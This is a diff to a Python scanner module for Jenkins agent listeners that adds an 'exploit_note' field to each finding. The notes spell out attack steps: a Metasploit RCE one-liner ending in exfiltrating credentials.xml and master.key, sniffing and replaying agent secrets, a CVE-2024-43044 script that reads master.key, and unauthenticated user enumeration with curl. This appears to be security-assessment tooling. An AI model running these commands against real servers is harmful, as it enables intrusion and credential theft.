@@ -423,10 +423,12 @@ def probe(ip: str, port: int = _DEFAULT_PORT, timeout: float = _TIMEOUT,
 
 # --- findings --------------------------------------------------------------
 
-def _finding(sev, title, target, detail, cmd, rem, cwes, kind=""):
+def _finding(sev, title, target, detail, cmd, rem, cwes, kind="",
+             exploit_note="", depth_tier=""):
     return {"severity": sev, "title": title, "target": target, "detail": detail,
             "tool": "nc", "command": cmd, "remediation": rem,
-            "cwes": cwes, "kind": kind}
+            "cwes": cwes, "kind": kind,
+            "exploit_note": exploit_note, "depth_tier": depth_tier}
 
 
 def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
@@ -463,7 +465,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "In Manage Jenkins → Configure Global Security → Agents, "
                     "select 'Random' or a fixed port and enable ONLY "
                     "JNLP4-connect. Disable inbound CLI over the agent port.",
-                    ["CWE-327"], kind="jnlp_legacy_protocols"))
+                    ["CWE-327"], kind="jnlp_legacy_protocols",
+                    exploit_note=(
+                        "Use jenkins-jnlp-agent.jar or a scapy-scripted JNLP1 "
+                        "handshake with a captured secret; confirm the "
+                        "controller accepts."),
+                    depth_tier="t1"))
 
             # Plaintext JNLP1/2 — secrets on the wire.
             plain = pr.get("plaintext_jnlp") or []
@@ -481,7 +488,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "Disable JNLP-connect and JNLP2-connect in Manage Jenkins "
                     "→ Configure Global Security → Agents. Require "
                     "JNLP4-connect (TLS-wrapped).",
-                    ["CWE-319"], kind="jnlp_plaintext_agent_channel"))
+                    ["CWE-319"], kind="jnlp_plaintext_agent_channel",
+                    exploit_note=(
+                        "tcpdump -i any -A 'tcp port 50000' — wait for an "
+                        "agent reconnect; grep for 64-hex secret. Replay via "
+                        "jenkins-jnlp-agent.jar with that secret + captured "
+                        "node name."),
+                    depth_tier="t1"))
 
             # CLI2 deserialization → CVE-2017-1000353.
             if "CLI2-connect" in cli_leg or "CLI-connect" in cli_leg:
@@ -503,7 +516,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "Upgrade to Jenkins ≥ 2.46.2 LTS / ≥ 2.57 weekly. On "
                     "modern Jenkins, disable inbound CLI over the agent "
                     "listener entirely (it is off by default since 2.54).",
-                    ["CWE-502"], kind="jnlp_cli2_deser_rce"))
+                    ["CWE-502"], kind="jnlp_cli2_deser_rce",
+                    exploit_note=(
+                        "msfconsole -q -x 'use exploit/linux/misc/"
+                        "jenkins_command_receive; set RHOSTS <ip>; set RPORT "
+                        "50000; set LHOST <lhost>; run' — then whoami/id, "
+                        "exfil credentials.xml + master.key."),
+                    depth_tier="t1"))
                 # Enrich with structured CVE ids for the vuln mapper.
                 out[-1]["cves"] = cve_ids
 
@@ -533,7 +552,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "controller to a management-only interface. The endpoint "
                     "is unauthenticated by design so the discovery it enables "
                     "is a network-segmentation control, not a Jenkins toggle.",
-                    ["CWE-200"], kind="jenkins_agent_listener_discovered"))
+                    ["CWE-200"], kind="jenkins_agent_listener_discovered",
+                    exploit_note=(
+                        "curl -sk http://<ip>:8080/tcpSlaveAgentListener/ -I; "
+                        "then curl -sk http://<ip>:8080/asynchPeople/api/json "
+                        "(unauth user list on many installs)."),
+                    depth_tier="t1"))
 
             # X-Instance-Identity fingerprint.
             fp = pr.get("instance_identity_fp") or ""
@@ -585,6 +609,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "(SECURITY-3430 fix). Interim: bind the agent port to a "
                     "management VLAN only agents can reach.",
                     ["CWE-22"], kind="jnlp_cve_2024_43044",
+                    exploit_note=(
+                        "python3 jenkins_43044_exploit.py --host <ip> --port "
+                        "50000 --agent <name> --secret <64hex> --file "
+                        "/var/lib/jenkins/secrets/master.key — extract, then "
+                        "decrypt credentials.xml offline."),
+                    depth_tier="t0",
                 ))
                 out[-1]["cves"] = ["CVE-2024-43044"]
 
@@ -606,6 +636,10 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     f"set RPORT {p.portid}; run'",
                     "Upgrade to Jenkins ≥ 2.46.2 LTS / ≥ 2.57 weekly.",
                     ["CWE-502"], kind="jnlp_cve_2017_1000353",
+                    exploit_note=(
+                        "msfconsole exploit/linux/misc/"
+                        "jenkins_command_receive — same as CLI2 finding."),
+                    depth_tier="t0",
                 ))
                 out[-1]["cves"] = ["CVE-2017-1000353"]
 
